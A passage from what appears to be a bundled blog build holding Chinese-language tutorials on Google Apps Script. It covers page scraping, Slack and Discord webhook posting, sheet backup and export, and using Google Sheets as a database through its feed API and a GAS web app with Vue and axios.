class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> htmlContent <span class=\"token operator\">=</span> UrlFetchApp<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getContentText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> $ <span class=\"token operator\">=</span> Cheerio<span class=\"token punctuation\">.</span><span class=\"token function\">load</span><span class=\"token punctuation\">(</span>htmlContent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> title <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"title\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">\"title\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> title<span class=\"token punctuation\">;</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">\"description\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"meta[name='description']\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attr</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">\"pref\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> title<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"赤十字血液センター｜日本赤十字社\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">\"demand_date\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".center-main-today-timedate\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">\"demands\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".center-main-today-types-state\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">each</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">index<span class=\"token punctuation\">,</span> element</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  ret<span class=\"token punctuation\">[</span><span class=\"token string\">\"demands\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"discord-webhook\">Discord Webhook</h2>\n<h3 id=\"url-fetch-app\">URL Fetch App</h3>\n<ul>\n<li><code>UrlFetchApp.fetch(url[, params])</code></li>\n</ul>\n<h4 id=\"parameters\">parameters</h4>\n<table>\n<thead>\n<tr>\n<th>parameter</th>\n<th>type</th>\n<th>description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>url</td>\n<td>String</td>\n<td>傳送 HTTP Request 的目標網址</td>\n</tr>\n<tr>\n<td>params.contentType</td>\n<td>String</td>\n<td>Request 的 Content-Type</td>\n</tr>\n<tr>\n<td>params.headers</td>\n<td>Object</td>\n<td>設定 Request Header 的 key/value object</td>\n</tr>\n<tr>\n<td>params.method</td>\n<td>String</td>\n<td>指定使用何種 method，預設為 <code>GET</code></td>\n</tr>\n<tr>\n<td>params.payload</td>\n<td>String</td>\n<td>指定 Request Body。<code>GET</code> 時無法指定。指定後會被視為 <code>application/x-www-form-urlencoded</code> 或 <code>multipart/form-data</code></td>\n</tr>\n</tbody></table>\n<h4 id=\"handle-response\">Handle Response</h4>\n<table>\n<thead>\n<tr>\n<th>method</th>\n<th>type</th>\n<th>description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>getContentText()</td>\n<td>String</td>\n<td>取得 Response Body</td>\n</tr>\n<tr>\n<td>getHeaders()</td>\n<td>Object</td>\n<td>取得 Response Header</td>\n</tr>\n<tr>\n<td>getResponseCode()</td>\n<td>Integer</td>\n<td>取得回傳的 HTTP 狀態</td>\n</tr>\n</tbody></table>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  channel<span class=\"token operator\">:</span> <span class=\"token string\">\"sample\"</span><span class=\"token punctuation\">,</span>\n  text<span class=\"token operator\">:</span> <span class=\"token string\">\"hello\"</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\nresponse <span class=\"token operator\">=</span> UrlFetchApp<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>\n  <span class=\"token string\">\"https://slack.com/api/chat.postMessage\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">{</span>\n    contentType<span class=\"token operator\">:</span> <span class=\"token string\">\"application/json\"</span>\n    headers<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token string\">\"Authorization\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Bearer xoxp-xxxxxxxxx-xxxx\"</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    method<span class=\"token operator\">:</span> <span class=\"token string\">\"post\"</span><span class=\"token punctuation\">,</span>\n    payload<span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span><span class=\"token function\">getResponseCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// output: 200</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span><span class=\"token function\">getContentText</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// output: '{ \"OK\": true, ... }'</span></code></pre><h3 id=\"建立-webhook\">建立 Webhook</h3>\n<ol>\n<li>點擊 Discord 頻道右邊的齒輪鍵</li>\n<li>點擊畫面左邊的 <code>Integrations</code> -&gt; <code>Create Webhook</code> -&gt; <code>Copy Webhook URL</code></li>\n</ol>\n<h3 id=\"撰寫-gas\">撰寫 GAS</h3>\n<p><code>Google App Script</code></p>\n<pre class=\"language-javaScript\"><code class=\"language-javaScript\">function sendToDiscord(message) {\n  const url      = ''; // 上方建立的 Webhook 網址\n  const token    = ''; // Webhook 網址後半的 token 部份\n                       // * 未確認是否已不需要\n  const channel  = '#general';\n  const text     = message;\n  const username = 'bot';\n  const parse    = 'full';\n  const method   = 'POST';\n\n  const payload = {\n    'token'     : token,\n    'channel'   : channel,\n    'content'   : text,\n    'username'  : username,\n    'parse'     : parse,\n  };\n\n  const params = {\n    'method': method,\n    'payload': payload,\n    'muteHttpExceptions': true\n  };\n\n  response = UrlFetchApp.fetch(url, params);\n}</code></pre><h2 id=\"add-timestamp\">Add Timestamp</h2>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 今天</span>\n<span class=\"token keyword\">var</span> date <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> today <span class=\"token operator\">=</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">formatDate</span><span class=\"token punctuation\">(</span>date<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Asia/Taipei\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"顯示格式\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 明天 i=1 昨天 i=-1</span>\n<span class=\"token keyword\">var</span> date <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndate<span class=\"token punctuation\">.</span><span class=\"token function\">setDate</span><span class=\"token punctuation\">(</span>date<span class=\"token punctuation\">.</span><span class=\"token function\">getDate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> day <span class=\"token operator\">=</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">formatDate</span><span class=\"token punctuation\">(</span>date<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Asia/Taipei\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"顯示格式\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p><code>顯示格式</code> 的部份可以使用 <code>年：y</code>、<code>月：M</code>、<code>日：d</code>、<code>時（12 小時制）：h</code>、<code>時（24 小時制）：H</code>、<code>分：m</code>、<code>秒：s</code> 自行制定格式</p>\n<p>例：<code>&#39;yyyy/MM/dd/HH:mm&#39;</code> → <code>2020/12/31/23:59</code></p>\n<h2 id=\"set-trigger\">Set Trigger</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/tapatyo/items/465a982635ba3933b32d\">【Google Apps Script】トリガーによる定期実行の時間のズレをなくす方法 - Qiita</a></li>\n</ul>\n<h3 id=\"display-message-box\">Display Message Box</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Browser<span class=\"token punctuation\">.</span><span class=\"token function\">msgBox</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"確認\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"是否要執行？\"</span><span class=\"token punctuation\">,</span> Browser<span class=\"token punctuation\">.</span>Buttons<span class=\"token punctuation\">.</span><span class=\"token constant\">YES_NO</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h2 id=\"write-gs-code-on-vscode\">Write GS code on VSCode</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/jooji/items/76f07f3f82900ebcd2b8\">[clasp]Google Apps Script を VSCode/Typescript/Git で書く。 - Qiita</a></li>\n</ul>\n<h2 id=\"backup-sheet\">Backup Sheet</h2>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> file <span class=\"token operator\">=</span> DriveApp<span class=\"token punctuation\">.</span><span class=\"token function\">getFileById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'File ID'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> folder <span class=\"token operator\">=</span> DriveApp<span class=\"token punctuation\">.</span><span class=\"token function\">getFolderById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Folder ID'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> filename <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'_'</span> <span class=\"token operator\">+</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">formatDate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'JST'</span> <span class=\"token string\">'MM/dd/HH:mm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nfile<span class=\"token punctuation\">.</span><span class=\"token function\">makeCopy</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> folder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"conver-sheet-to-excel-file\">Conver Sheet to excel file</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//エクセルを返すURL</span>\n<span class=\"token keyword\">var</span> fetchUrl <span class=\"token operator\">=</span>\n  <span class=\"token string\">\"https://docs.google.com/feeds/download/spreadsheets/Export?key=\"</span> <span class=\"token operator\">+</span>\n  <span class=\"token string\">\"シートID\"</span> <span class=\"token operator\">+</span>\n  <span class=\"token string\">\"&amp;amp;exportFormat=xlsx\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//OAuth</span>\n<span class=\"token keyword\">var</span> fetchOpt <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  headers<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> Authorization<span class=\"token operator\">:</span> <span class=\"token string\">\"Bearer \"</span> <span class=\"token operator\">+</span> ScriptApp<span class=\"token punctuation\">.</span><span class=\"token function\">getOAuthToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  muteHttpExceptions<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//エクセルファイルゲット！</span>\n<span class=\"token keyword\">var</span> xlsxFile <span class=\"token operator\">=</span> UrlFetchApp<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>fetchUrl<span class=\"token punctuation\">,</span> fetchOpt<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">getBlob</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"任意の名前.xlsx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>","date":"2020-08-25T03:21:09.000Z","excerpt":"","printDate":"August 25, 2020","printReadingTime":"5 min read"};

var route_49 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod61
});

var Mod62 = {"title":"將 Google Sheet 做為資料庫使用","slug":"google-sheet-as-database","html":"<p>Google 所提供的 Sheet API 可以直接將 Sheet 內容轉換成 JSON 格式輸出，\n<br>亦可接受從外部傳進資料，修改 Sheet 裡的內容，\n<br>並且都有提供 CORS 支援，可以免於處理跨域的困擾。</p>\n<p>本文整理了兩種使用方式：</p>\n<ol>\n<li>直接串現有的 API 純讀取</li>\n<li>透過 Google Apps Script 讀取與寫入</li>\n</ol>\n<h2 id=\"1-純讀取（google-sheets-only）\">1. 純讀取（Google Sheets Only）</h2>\n<h3 id=\"表單處理\">表單處理</h3>\n<ol>\n<li>開啟 Google 表單檔案</li>\n<li>點擊「檔案（File）」\n<br>├ →「發佈到網路（Publish to the web）」\n<br>├ → 挑選要發佈的 Sheet，或是發佈整份文件\n<br>└ →「發佈（Publish）」將此表單公開</li>\n<li>複製表單網址裡 <code>[sheet-id]</code> 的部份\n<br>├ （注意：不是發佈頁面的連結網址，是原始 Sheet 的網址）\n<br>└ <code>https://docs.google.com/spreadsheets/d/[sheet-id]/</code></li>\n<li>將 <code>[sheet-id]</code> 貼進下方 Spreadsheets Data API 網址裡的對應處\n<br>├ <code>https://spreadsheets.google.com/feeds/cells/[sheet-id]/[sheet-index]/public/values?alt=json</code>\n<br>├ or <code>https://spreadsheets.google.com/feeds/list/[sheet-id]/[sheet-index]/public/values?alt=json</code>\n<br>└ 預設格式為 xml，我們在後面加上 <code>?alt=json</code> 改為取得 JSON 格式的資料</li>\n<li><code>[sheet-index]</code> 可以指定想要取用整份表單裡的第幾個分頁，\n<br>├ 在一些相關文章裡會看到這邊填上 <code>od6</code>，\n<br>│ 這個用法看起來是 API 的預設值，\n<br>│ 我們可以改為直接填上需要的頁數數字即可\n<br>├ 如: <code>https://spreadsheets.google.com/feeds/cells/[sheet-id]/1/public/values?alt=json</code>\n<br>└ 這就是我們需要的資料庫網址了</li>\n</ol>\n<h3 id=\"接入網頁\">接入網頁</h3>\n<p>我們從 GET 取得的原始資料內容結構為（僅截取較常用到的資訊）：</p>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  \"version\": \"1.0\",\n  \"encoding\": \"UTF-8\",\n  \"feed\": {\n    \"xmlns\": \"http://www.w3.org/2005/Atom\",\n    ...\n    \"title\": {\n      \"type\": \"text\",\n      \"$t\": \"Sheet1\"\n    },\n    \"link\": [...],\n    ...\n    \"entry\": [\n      {\n        \"id\": {...},\n        ...\n      },\n      \"content\": {\n        \"type\": \"text\",\n        \"$t\": \"content\"\n      },\n      \"link\": [...],\n      \"gs$cell\": {\n        \"row\": \"1\",\n        \"col\": \"1\",\n        \"$t\": \"content\"\n      },\n      ...\n    ]\n  }\n}</code></pre><p>主要儲存的內容在 <code>feed.entry.content</code> 或 <code>feed.entry.gs$cell</code> 裡</p>\n<p>我使用的是 <code>axios</code> 搭配 <code>vue</code> 和 <code>Bootstrap</code>\n<br>以 <code>loading</code> 判斷於資料讀取完畢前顯示讀取動畫</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>template</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>d-flex justify-content-center<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>loading<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>spinner-border<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">role</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>status<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sr-only<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Loading...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-else</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>entry in entries<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ entry.content.$t }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>template</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">data</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n        entries<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        loading<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n        error<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">mounted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      axios\n        <span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>\n          <span class=\"token string\">\"https://spreadsheets.google.com/feeds/cells/[sheet-id]/1/public/values?alt=json\"</span>\n        <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>entries <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>feed<span class=\"token punctuation\">.</span>entry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n          console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>error <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">finally</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>loading <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre><p>可以再搭配 <code>filter()</code> 單獨取得每一行（row）資料：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> rowData <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> rowIndex <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\nentry\n  <span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> item<span class=\"token punctuation\">.</span>gs$cell<span class=\"token punctuation\">.</span>row <span class=\"token operator\">==</span> rowIndex<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> rowData<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span>$t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>或是每一列（col）資料：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> colData <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> colIndex <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\nentry\n  <span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> item<span class=\"token punctuation\">.</span>gs$cell<span class=\"token punctuation\">.</span>col <span class=\"token operator\">==</span> colIndex<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> colData<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span>$t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>完成！</p>\n<h2 id=\"2-讀取--寫入（google-sheets--google-apps-script）\">2. 讀取 + 寫入（Google Sheets + Google Apps Script）</h2>\n<h3 id=\"簡介\">簡介</h3>\n<ol>\n<li>開啟 Google 表單檔案</li>\n<li>點擊「工具（Tools）」\n<br>└ →「指令碼編輯器（Script editor）」</li>\n<li>撰寫 GAS 上的處理 function\n<br> GAS 預設以\n<br>├ <code>doGet</code> function 處理 GET 要求\n<br>└ <code>doPost</code> function 處理 POST 要求</li>\n<li>點擊「發佈（Publish）」\n<br>├ →「部署為網路應用程式…（Deploy as web app...）」\n<br>├ →「將應用程式執行為（Execute the app as）」選擇「我（Me）」\n<br>├ →「具有應用程式存取權的使用者（Who has access to the app）」\n<br>│ 選擇「任何人，甚至匿名使用者（Anyone, even anonymous）」\n<br>├ →「部署（Deploy）」→「核對權限」→ 選擇授權用的 Google 帳號\n<br>├ →「進階」→「前往（此應用程式名稱）」→ 允許\n<br>└ → 此 app URL 即為讀取與寫入用的網址</li>\n<li>（※重要）更新 GAS 程式後，在重新發佈時「專案版本（Project version）」要選擇「新增（New）」\n<br>├ 既有數字是之前點擊發佈時的版本的程式碼，不會反應最新的修改內容\n<br>└ 改動後一定要選擇「新增」專案版本，才會有效反應</li>\n<li>撰寫網頁部份處理 function</li>\n</ol>\n<h3 id=\"google-app-script\">Google App Script</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 複製 Sheet 網址裡 [sheet-id] 的部份</span>\n<span class=\"token comment\">// 